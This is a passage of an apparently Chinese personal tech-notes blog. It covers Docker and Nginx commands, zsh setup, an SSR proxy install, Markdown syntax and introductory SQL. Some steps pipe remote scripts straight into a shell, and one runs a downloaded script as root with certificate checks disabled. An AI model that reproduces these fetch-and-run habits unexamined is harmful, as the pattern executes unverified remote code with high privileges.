class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -t IMAGE /bin/bash  # 启动交互式容器</span><br><span class="line">docker inspect NAME  # 查看详细信息？</span><br><span class="line">docker run --name=xxx -it IMAGE /bin/bash  # 以xxx为名字运行</span><br><span class="line"><span class="meta">#</span><span class="bash"> CTRL + p + q   =&gt;  退出并后台运行</span></span><br><span class="line">docker attach 容器名  # 恢复到后台容器，更建议使用 docker exec？</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看守护进程</span></span><br><span class="line">ps -ef | grep docker</span><br><span class="line">sudo status docker</span><br><span class="line"></span><br><span class="line">docker top </span><br><span class="line">docker exec [-d][-i][-t] nginx  # 为运行中的容器启动新进程</span><br><span class="line">docker logs </span><br><span class="line">docker images#列出本地镜像</span><br><span class="line">docker start CONTAINER #启动一个或多少已经被停止的容器</span><br><span class="line">docker stop / kill CONTAINER #停止一个运行中的容器</span><br><span class="line">docker restart CONTAINER #重启容器</span><br><span class="line">docker rm CONTAINER #删除容器  -f 强制删除</span><br><span class="line">docker rmi IMAGE #删除镜像</span><br><span class="line">docker rmi $(docker images -q ubuntu)  # 删除Ubuntu所有镜像</span><br><span class="line">sudo systemctl daemon-reload #reload daemon.json</span><br><span class="line">sudo systemctl restart docker #重启docker</span><br><span class="line"></span><br><span class="line">docker info  # 查看信息</span><br><span class="line">docker diff 容器名 # 查看改动信息</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 端口映射</span></span><br><span class="line">docker run -p 80 -it # -i 标准输入保持打开</span><br><span class="line">docker run -p 8080:80 -it # -t 为docker分配一个伪终端(pseudo-tty)，并绑定到容器的标准输入</span><br><span class="line">docker run -p 0.0.0.0:80 -it </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看端口映射情况</span></span><br><span class="line">docker port docker_name</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 容器快照？</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 导出容器</span></span><br><span class="line">docker export ID &gt; ubuntu.zip</span><br><span class="line"><span class="meta">#</span><span class="bash"> 导入容器</span></span><br><span class="line">cat ubuntu.zip | docker import - test/ubuntu:v1.0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过URL导入</span></span><br><span class="line">docker import http://xxx example/imagesrepo</span><br><span class="line"><span class="meta">#</span><span class="bash"> 数据卷</span></span><br><span class="line">docker volume create xxx</span><br><span class="line">docker run -it -v ~/datavolume:/data:ro ubuntu /bin/bash  # ro设置只读权限</span><br><span class="line"><span class="meta">#</span><span class="bash"> 数据卷容器</span></span><br><span class="line">docker run -it --name dv --volumes-from dvt4 ubuntu /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制文件到容器中</span></span><br><span class="line">docker cp xxx id:/dir</span><br><span class="line">docker cp ./test apache:/var/www/</span><br><span class="line">docker exec -it apache</span><br></pre></td></tr></table></figure><p>Nginx 部署流程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建映射80端口的交互式容器</span></span><br><span class="line">docker run -p 8080:80 --name web -it ubuntu /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装Nginx</span></span><br><span class="line">apt update</span><br><span class="line">apt install - y nginx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装文本编辑器 vim</span></span><br><span class="line">apt install -y vim</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建静态页面</span></span><br><span class="line">cd /var/www/html</span><br><span class="line">touch index.html</span><br><span class="line">echo '&lt;h1&gt;Hello, Docker!&lt;/h1&gt;' &gt; index.html</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改Nginx配置文件</span></span><br><span class="line">whereis nginx  # 找到安装目录</span><br><span class="line">vim /etc/nginx/sites-enabled/default  # 修改 root 目录</span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行Nginx</span></span><br><span class="line">nginx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证网站访问</span></span><br><span class="line">curl IP:port  # ip 可用宿主机的IP加映射端口，也可以用 docker inspect web 查看真实容器IP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 停止容器</span></span><br><span class="line">docker stop web</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">docker start -i web  # 此时会发现，nginx已经停止</span><br><span class="line">docker exec web nginx </span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果之前没有指定端口时，重新启动时 port 将发生变化</span></span><br></pre></td></tr></table></figure><p>Docker也遵守Linux命令的格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker [option] [command] [arguments]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker search ubuntu  # 查找镜像</span><br><span class="line">docker pull name# 下载image</span><br><span class="line">docker push # 推送镜像</span><br></pre></td></tr></table></figure><h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 通过容器构建</span></span><br><span class="line">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</span><br><span class="line">docker commit \</span><br><span class="line">    --author "Tao Wang &lt;twang2218@gmail.com&gt;" \</span><br><span class="line">    --message "修改了默认网页" \</span><br><span class="line">    webserver \</span><br><span class="line">    nginx:v2</span><br><span class="line"><span class="meta">#</span><span class="bash"> ！慎用 docker commit</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用dockerfile构建镜像  —— 包括一系列命令的文件，类似shell脚本？</span></span><br><span class="line">dockerfile编写语法</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注释</span></span><br><span class="line"></span><br><span class="line">docker build   # 构建镜像</span><br></pre></td></tr></table></figure><p><strong>配置 Docker 加速器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br><span class="line">sudo systemctl restart docker.service  # 重启 Docker 生效</span><br><span class="line"></span><br><span class="line">docker info</span><br><span class="line"><span class="meta">#</span><span class="bash"> 包含以下信息，加速器配置成功</span></span><br><span class="line">Registry Mirrors:</span><br><span class="line"> http://f1361db2.m.daocloud.io/</span><br></pre></td></tr></table></figure><p><strong>Docker不使用sudo</strong></p><p>将用户添加到 docker 用户组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker $USER  # 先试这个</span><br><span class="line"></span><br><span class="line">cat /etc/group | grep docker # 查找 docker 组，确认其是否存在</span><br><span class="line">groups # 列出自己的用户组，确认自己在不在 docker 组中</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果 docker 组不存在，则添加之：</span></span><br><span class="line">sudo groupadd docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将当前用户添加到 docker 组</span></span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启服务</span></span><br><span class="line">sudo service docker restart</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换一下用户组（刷新缓存）</span></span><br><span class="line">newgrp - docker;</span><br><span class="line">newgrp - `groups $&#123;USER&#125; | cut -d' ' -f1`; # TODO：必须逐行执行，不知道为什么，批量执行时第二条不会生效</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者，注销并重新登录</span></span><br><span class="line">pkill X</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/2ad3edf3c61f" target="_blank" rel="noopener">sqli-labs Docker</a></p><h2 id="zsh-配置"><a href="#zsh-配置" class="headerlink" title="zsh 配置"></a>zsh 配置</h2><h3 id="基本安装"><a href="#基本安装" class="headerlink" title="基本安装"></a>基本安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">echo $SHELL  查看当前shell环境</span><br><span class="line">cat /etc/shells  查看系统已有哪些shell</span><br><span class="line">sudo apt install zsh  安装zsh</span><br><span class="line">chsh -s $(which zsh)  将默认shell改为zsh</span><br><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh        安装oh-my-zsh</span><br><span class="line">~/.oh-my-zsh/themes已有主题目录（最爱：agnoster)</span><br><span class="line">~/.oh-my-zsh/pluglins   已有插件目录，如果自己下载的话，clone到这个目录</span><br><span class="line">source ~/.zshrc刷新配置文件</span><br><span class="line"></span><br><span class="line">常用插件：</span><br><span class="line">z, rails, git, colored-man-pages</span><br><span class="line">zsh-syntax-highlighting</span><br><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting  注意clone到plugins目录</span><br><span class="line">zsh-autosuggestions</span><br><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions</span><br><span class="line"></span><br><span class="line">小技巧：</span><br><span class="line">用 /  代替 cd /</span><br><span class="line">用 .. 代替 cd ..</span><br><span class="line">用 …. 代替 cd ../..</span><br><span class="line">用 ~  代替 cd ~</span><br><span class="line">take fold_name: 建立fold_name的文件夹并且切换进去</span><br><span class="line">x: 使用 x 代替 tar bz2 gz zip 等等一系列的命令</span><br></pre></td></tr></table></figure><h3 id="Powerline-fonts"><a href="#Powerline-fonts" class="headerlink" title="Powerline fonts"></a>Powerline fonts</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/powerline/fonts.git</span><br><span class="line">cd fonts</span><br><span class="line">./install.sh</span><br><span class="line"></span><br><span class="line">或者直接 sudo apt-get install fonts-powerline</span><br><span class="line">然后重启终端，其他的啥也不用干</span><br></pre></td></tr></table></figure><h2 id="SSR-安装"><a href="#SSR-安装" class="headerlink" title="SSR 安装"></a>SSR 安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh</span><br><span class="line">sudo chmod +x ssr.sh</span><br><span class="line">sudo bash ssr.sh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iOS 端可以从pp助手安装 Shadowrocket（pp正版）</span><br><span class="line">最重要的一点，配置时类型要选择 ShadowsocksR</span><br></pre></td></tr></table></figure><p><img src="https://sobaigu.com/images/srocketapp4.png" alt="avatar"></p><h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="www.google.com">这就是谷歌的链接</a></p><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p>基本形式</p><table><thead><tr><th>First Header</th><th>Second Header</th><th>Third Header</th></tr></thead><tbody><tr><td>Content Cell</td><td>Content Cell</td><td>Content Cell</td></tr><tr><td>Content Cell</td><td>Content Cell</td><td>Content Cell</td></tr></tbody></table><p>左、右对齐，居中</p><table><thead><tr><th style="text-align:left">First Header</th><th style="text-align:center">Second Header</th><th style="text-align:right">Third Header</th></tr></thead><tbody><tr><td style="text-align:left">Left</td><td style="text-align:center">Center</td><td style="text-align:right">Right</td></tr><tr><td style="text-align:left">Left</td><td style="text-align:center">Center</td><td style="text-align:right">Right</td></tr></tbody></table><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">st=&gt;start: Start</span><br><span class="line">e=&gt;end: End</span><br><span class="line">接收用户名和密码=&gt;operation: 接收用户名和密码</span><br><span class="line">使用用户名查询数据库=&gt;operation: 使用用户名查询数据库</span><br><span class="line">数据库中是否有数据=&gt;condition: 数据库中是否有数据?</span><br><span class="line">走登录逻辑=&gt;operation: 走登录逻辑</span><br><span class="line">走注册逻辑=&gt;operation: 走注册逻辑</span><br><span class="line">密码是否正确=&gt;condition: 密码是否正确?</span><br><span class="line">把用户名和密码写入数据库=&gt;inputoutput: 把用户名和密码写入数据库 </span><br><span class="line">st-&gt;接收用户名和密码-&gt;使用用户名查询数据库-&gt;数据库中是否有数据</span><br><span class="line">数据库中是否有数据(yes)-&gt;走登录逻辑-&gt;密码是否正确</span><br><span class="line">数据库中是否有数据(no)-&gt;走注册逻辑-&gt;把用户名和密码写入数据库-&gt;e</span><br><span class="line">密码是否正确(yes)-&gt;e</span><br><span class="line">密码是否正确(no,down)-&gt;接收用户名和密码</span><br></pre></td></tr></table></figure><h3 id="时序图"><a href="#时序图" class="headerlink" title="时序图"></a>时序图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Title: Here is a title</span><br><span class="line">A-&gt;B: Normal line</span><br><span class="line">B--&gt;C: Dashed line</span><br><span class="line">C-&gt;&gt;D: Open arrow</span><br><span class="line">D--&gt;&gt;A: Dashed open arrow</span><br></pre></td></tr></table></figure><h3 id="甘特图"><a href="#甘特图" class="headerlink" title="甘特图"></a>甘特图</h3><p>待补充</p><h3 id="标记"><a href="#标记" class="headerlink" title="标记 "></a>标记 <code></code></h3><p>这就是<code>标记</code></p><h3 id="插图"><a href="#插图" class="headerlink" title="插图"></a>插图</h3><h4 id="基本格式："><a href="#基本格式：" class="headerlink" title="基本格式："></a>基本格式：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">![Alt text](图片链接 "optional title")</span><br><span class="line"></span><br><span class="line">Alt text：图片的Alt标签，用来描述图片的关键词，可不写。</span><br><span class="line">最初的本意是当图片因为某种原因不能被显示时而出现的替代文字，后来又被用于SEO，</span><br><span class="line">可以方便搜索引擎根据Alt text里面的关键词搜索到图片。 </span><br><span class="line">图片链接：可以是图片的本地地址或网址。"optional title"：鼠标悬置于图片上会出现的标题文字，可不写。</span><br></pre></td></tr></table></figure><h4 id="插入本地图片"><a href="#插入本地图片" class="headerlink" title="插入本地图片"></a>插入本地图片</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![avatar](/home/picture/1.png)</span><br><span class="line">支持绝对路径和相对路径</span><br></pre></td></tr></table></figure><ul><li>缺点：不灵活不好分享，本地图片的路径更改或丢失都会造成markdown文件调不出图</li></ul><h4 id="Markdown-插入在线图片"><a href="#Markdown-插入在线图片" class="headerlink" title="Markdown 插入在线图片"></a><strong>Markdown</strong> 插入在线图片</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![avatar](地址)</span><br></pre></td></tr></table></figure><ul><li>缺点：将图片存在网络服务器上，非常依赖网络</li></ul><h4 id="把图片存入文件-Markdown"><a href="#把图片存入文件-Markdown" class="headerlink" title="把图片存入文件 Markdown"></a>把图片存入文件 <strong>Markdown</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">![avatar][base64str]</span><br><span class="line">[base64str]:data:image/png;base64,iVBORw0......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64的图片编码如何得来？</span><br><span class="line"></span><br><span class="line">1.用python将图片转化为base64字符串:</span><br><span class="line">import base64</span><br><span class="line">f = open('723.png','rb') # 二进制方式打开图文件</span><br><span class="line">ls_f = base64.b64encode(f.read())   # 读取文件内容，转换为base64编码</span><br><span class="line">f.close()</span><br><span class="line">print(ls_f)</span><br><span class="line"></span><br><span class="line">2.base64字符串转化为图片</span><br><span class="line">import base64</span><br><span class="line">bs = 'iVBORw0KGgoAAAANSUhEUg....'     # 太长了省略</span><br><span class="line">imgdata = base64.b64decode(bs)</span><br><span class="line">file = open('2.jpg','wb')</span><br><span class="line">file.write(imgdata)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p><strong>基本概念：</strong></p><ul><li><p>SQL 语句：Structured Query Language. DBMS 用来和数据库打交道的标准语言。不区分大小写。</p></li><li><p>Database：</p><p>  按照数据结构来组织、存储和管理数据的仓库。解决的问题：持久化存储，优化读写，保证数据的有效性。</p><p>  三种模型：</p><ul><li>层次模型。看起来就像一棵树。</li><li>网状模型。看其他就像一张图。</li><li><p>关系模型。看起来就像一张Excel。关系型数据库是建立在关系模型基础上的数据库，借助集合代数等数学概念和方法来处理数据库中的数据。</p><p>分类：文档型（SQLite），轻巧，省电，效率低；服务型（MySQL），性能强；</p><p>数据库设计：</p></li><li><p>三范式：列不可拆分，唯一标识，引用主键</p></li><li>关系及存储：1对1,1对多，多对多</li></ul></li><li><p>每一行称为<code>记录</code>（Record），记录的是一个逻辑意义上的数据。</p></li><li><p>每一列称为<code>字段</code>（Column），同一个表的每一行记录都拥有相同的若干字段。</p><p>  字段定义了数据类型，以及是否允许为 NULL，注意 NULL 表示字段数据不存在，并非为 0。</p><p>  不允许为NULL可以简化查询条件，加快查询速度，也利于应用程序读取数据后无需判断是否为NULL。</p></li><li><p>关系表中任意两条记录不能重复，不能重复不是指两条记录不完全相同，而是指能够通过某个字段唯一确定一条记录，这个字段被称为<code>主键</code>。</p><p>  主键选取原则：不使用任何业务相关的字段作为主键。</p><p>  一般把主键字段命名为<code>id，</code>常见<code>id</code>字段类型有自增整数类型、全局唯一 GUID 类型。</p><p>  记录一旦插入表中，主键最好不要修改，否则会造成一系列的影响。</p></li><li><p>关系数据库允许通过多个字段唯一标识记录，即两个或更多字段都设置为主键，这种主键被称为<code>联合主键</code>。</p><p>  作为联合主键的字段中，只要不出现全部相同字段就行。</p></li><li><p>外键：</p><p>  外键并不是通过列名实现的，而是通过定义外键约束实现的：</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_class_id</span><br><span class="line"><span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (class_id)</span><br><span class="line"><span class="keyword">REFERENCES</span> classes (<span class="keyword">id</span>);</span><br></pre></td></tr></table></figure><p>  删除一个外键约束</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> fk_class_id;</span><br></pre></td></tr></table></figure><p>  注意：删除外键约束并没有删除外键这一列。删除列是通过<code>DROP COLUMN ...</code>实现的。</p></li><li><p>索引</p></li><li><p>Mysql：关系型数据库管理系统（DBMS）之一，开源。默认端口：3306</p></li></ul><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><ul><li><p>基本查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> &lt;表名&gt;;  <span class="comment">-- 查询表的所有数据，* 表示所有列</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">100</span>+<span class="number">200</span>;  <span class="comment">-- 直接返回计算结果，可以执行 SELECT 1; 来测试数据库连接</span></span><br></pre></td></tr></table></figure></li><li><p>条件查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> &lt;表名&gt; <span class="keyword">WHERE</span> score &gt;= <span class="number">80</span>;  <span class="comment">-- where 后接条件语句</span></span><br><span class="line"><span class="comment">-- 使用 AND OR NOT，即与、或、非，优先级：NOT &gt; AND &gt; OR</span></span><br><span class="line">   =    &gt;     &gt;=      &lt;     &lt;=     &lt;&gt;</span><br><span class="line"><span class="comment">-- 等于 大于 大于或等于 小于 小于或等于 不等</span></span><br><span class="line">LIKE </span><br><span class="line"><span class="comment">-- name LIKE 'ab%'name LIKE '%bc%' %表示任意字符，例如'ab%'将匹配'ab'，'abc'，'abcd'</span></span><br></pre></td></tr></table></figure></li><li><p>投影查询：查询指定列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, score, <span class="keyword">name</span> <span class="keyword">FROM</span> students;</span><br><span class="line"><span class="comment">-- 还可以给列起别名</span></span><br><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span> 别名<span class="number">1</span>, 列<span class="number">2</span> 别名<span class="number">2</span>, 列<span class="number">3</span> 别名<span class="number">3</span> <span class="keyword">FROM</span> ...</span><br></pre></td></tr></table></figure></li><li><p>排序</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> gender, score <span class="keyword">FROM</span> students <span class="keyword">ORDER</span> <span class="keyword">BY</span> score;  <span class="comment">-- 按score从低到高（ASC被省略）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>, gender, score <span class="keyword">FROM</span> students <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>;  <span class="comment">-- 高到低</span></span><br><span class="line">ORDER BY score DESC, gender;  <span class="comment">-- score相同再按gender排序</span></span><br></pre></td></tr></table></figure></li><li><p>分页查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, gender, score</span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span></span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">3</span> <span class="keyword">OFFSET</span> <span class="number">0</span>;  <span class="comment">-- 每页三条记录，最多取三条，OFFSET 为 3 则跳过前三条</span></span><br><span class="line"><span class="comment">--OFFSET超过了查询的最大数量并不会报错，而是得到一个空的结果集</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>, <span class="number">10</span>  <span class="comment">-- 1,10</span></span><br></pre></td></tr></table></figure></li><li><p>聚合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> students;  <span class="comment">-- 查询所有列的行数</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) boys <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> gender = <span class="string">'M'</span>;  <span class="comment">-- 搭配条件语句，别名为 boys</span></span><br><span class="line">            SUM                      AVG                 MAX       MIN</span><br><span class="line"><span class="comment">--某列的和，该列必须为数值类型 某列的平均值，该列必须为数值类型 某列的最大值 某列的最小值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">num</span> <span class="keyword">FROM</span> students <span class="keyword">GROUP</span> <span class="keyword">BY</span> class_id;  <span class="comment">-- 按 class_id 分组，返回三行数据</span></span><br><span class="line"><span class="keyword">SELECT</span> class_id, <span class="keyword">COUNT</span>(*) <span class="keyword">num</span> <span class="keyword">FROM</span> students <span class="keyword">GROUP</span> <span class="keyword">BY</span> class_id;  <span class="comment">-- 增加 class_id 列</span></span><br><span class="line"><span class="keyword">SELECT</span> class_id, gender, <span class="keyword">COUNT</span>(*) <span class="keyword">num</span> <span class="keyword">FROM</span> students </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> class_id, gender;  <span class="comment">-- 按 class_id, gender 分组</span></span><br></pre></td></tr></table></figure><p>如果聚合查询的<code>WHERE</code>条件没有匹配到任何行，<code>COUNT()</code>会返回0，而<code>MAX()</code>、<code>MIN()</code>、<code>MAX()</code>和<code>MIN()</code>会返回<code>NULL</code></p></li><li><p>多表查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">FROM</span> &lt;表<span class="number">1</span>&gt; &lt;表<span class="number">2</span>&gt;;  <span class="comment">-- 返回两表的笛卡尔积表</span></span><br><span class="line"><span 